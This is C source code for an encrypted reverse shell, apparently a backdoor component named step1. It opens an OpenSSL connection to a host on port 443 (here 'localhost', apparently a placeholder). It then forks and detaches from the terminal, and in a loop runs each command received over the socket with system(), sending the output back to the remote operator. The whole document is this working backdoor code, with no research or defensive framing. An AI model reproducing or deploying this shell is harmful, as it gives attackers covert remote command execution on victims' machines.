typedef struct
{
    int sslfd;
    SSL *sslhandle;
    SSL_CTX *sslctx;
} sslsocket;

int lookup_host(const char *host, char *adrr)
{
    struct addrinfo hints, *result;
    void *ptr;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = PF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags |= AI_CANONNAME;

    if (getaddrinfo(host, NULL, &hints, &result) != 0)
    {
        perror("getaddrinfo");
        return -1;
    }

    inet_ntop(result->ai_family, result->ai_addr->sa_data, adrr, 16);

    switch (result->ai_family)
    {
    case AF_INET:
        ptr = &((struct sockaddr_in *)result->ai_addr)->sin_addr;
        break;
    case AF_INET6:
        ptr = &((struct sockaddr_in6 *)result->ai_addr)->sin6_addr;
        break;
    }
    inet_ntop(result->ai_family, ptr, adrr, 16);

    freeaddrinfo(result);

    return 0;
}

int open_sll_socket(const char *addr, const int port, sslsocket *ssl_sock)
{
    struct sockaddr_in s_addr;
    socklen_t sin_size;

    s_addr.sin_family = AF_INET;
    s_addr.sin_port = htons(port);
    s_addr.sin_addr.s_addr = inet_addr(addr);

    if ((ssl_sock->sslfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
    {
        perror("socket");
        return -1;
    }
    if (connect(ssl_sock->sslfd, (struct sockaddr *)&s_addr, sizeof(s_addr)) == -1)
    {
        perror("connect");
        return -1;
    }

    SSL_library_init();
    OpenSSL_add_all_algorithms();

    ssl_sock->sslctx = SSL_CTX_new(SSLv23_client_method());
    ssl_sock->sslhandle = SSL_new(ssl_sock->sslctx);

    if (!SSL_set_fd(ssl_sock->sslhandle, ssl_sock->sslfd))
    {
        perror("SSL_set_fd");
        return -1;
    }
    if (SSL_connect(ssl_sock->sslhandle) != 1)
    {
        perror("SSL_connect");
        return -1;
    }

    return 0;
}

void close_ssl_socket(sslsocket *s)
{
    close(s->sslfd);
    SSL_shutdown(s->sslhandle);
    SSL_CTX_free(s->sslctx);
}

int step1()
{
    int pid;
    char addr[16];
    int pipes[2];
    int recv_length, output_length;
    char command[1024];
    char command_output[1024];
    int last_cmd_len = 0;
    struct sockaddr_in sa;
    int s;

    lookup_host("localhost", addr);

    sslsocket *ssl_sock = malloc(sizeof(sslsocket));

    if (open_sll_socket(addr, 443, ssl_sock))
    {
        return -1;
    }

    switch ((pid = fork()))
    {
    case -1:
        exit(EXIT_FAILURE);

    case 0:
        if (pid == 0)
        {
            pipe(pipes);
            dup2(pipes[1], STDOUT_FILENO);
            dup2(pipes[1], STDERR_FILENO);
            close(pipes[1]);
            fcntl(pipes[0], F_SETFL, fcntl(pipes[0], F_GETFL) | O_NONBLOCK);

            setsid();

            while (1) // TODO check if socket alive
            {
                memset(command, 0, sizeof(command));
                SSL_write(ssl_sock->sslhandle, ">>", 2);
                recv_length = SSL_read(ssl_sock->sslhandle, &command, sizeof(command) - 6);
                if (recv_length > 0)
                {
                    command[recv_length - 1] = '\0';
                    if (strcmp(command, "exit") == 0)
                    {
                        break;
                    }

                    system(command);

                    output_length = read(pipes[0], command_output, sizeof(command_output));

                    if(output_length > 0){
                        SSL_write(ssl_sock->sslhandle, command_output, output_length);
                    }
                }
            }

            close_ssl_socket(ssl_sock);
        }
    }
}

